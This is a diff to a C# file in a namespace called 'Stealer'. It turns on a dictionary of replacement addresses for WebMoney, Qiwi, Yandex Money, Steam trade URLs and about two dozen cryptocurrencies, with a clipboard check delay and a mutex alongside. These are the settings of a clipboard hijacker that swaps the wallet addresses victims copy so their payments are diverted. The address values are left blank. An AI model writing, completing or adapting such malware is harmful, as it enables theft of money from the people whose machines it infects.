@@ -18,10 +18,51 @@ namespace Stealer
         // Clipboard check delay in seconds
         public static int clipboard_check_delay = 2;
         // Replace to
-        //public static Dictionary<string, string> addresses = new Dictionary<string, string>()
-        //{
-        //
-        //}
+        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
+        {
+            // WebMoney
+            {"wmr", "" },
+            {"wmg", "" },
+            {"wmz", "" },
+            {"wmh", "" },
+            {"wmu", "" },
+            {"wmx", "" },
+
+            // Qiwi
+            {"qiwiua", "" }, // UA
+            {"qiwiru", "" }, // RU
+
+            // Yandex money
+            {"yandex", "" },
+
+            // Steam trade url
+            {"steam", "" },
+
+            // Cryptocurrency
+            {"btc", "" }, // Bitcoin
+            {"eth", "" }, // Ethereum
+            {"xmr", "" }, // Monero
+            {"xlm", "" }, // Stellar
+            {"xrp", "" }, // Ripple
+            {"ltc", "" }, // Litecoin
+            {"nec", "" }, // Neocoin
+            {"bch", "" }, // Bitcoin Cash
+            {"bcn", "" }, // Bytecoin
+            {"ada", "" }, // Cardano
+            {"grft", "" }, // Graft
+            {"zcash", ""}, // Zcash
+            {"btg", "" },  // Bitcoin Gold
+            {"waves", "" }, // Waves
+            {"rdd", "" }, // ReddCoin
+            {"blk", "" }, // BlackCoin
+            {"emc", "" }, // Emercoin
+            {"strat", "" }, // Stratis
+            {"qtum", "" }, // Qtum
+            {"via", "" }, // Viacoin
+            {"lsk", "" }, // Lisk
+            {"doge", "" }, // Dogecoin
+            {"dash", "" } // Dashcoin
+        };
 
         // Mutex (random)
         public static string mutex = "asuhdvaystdvytasdvtyasvdfctyasd";
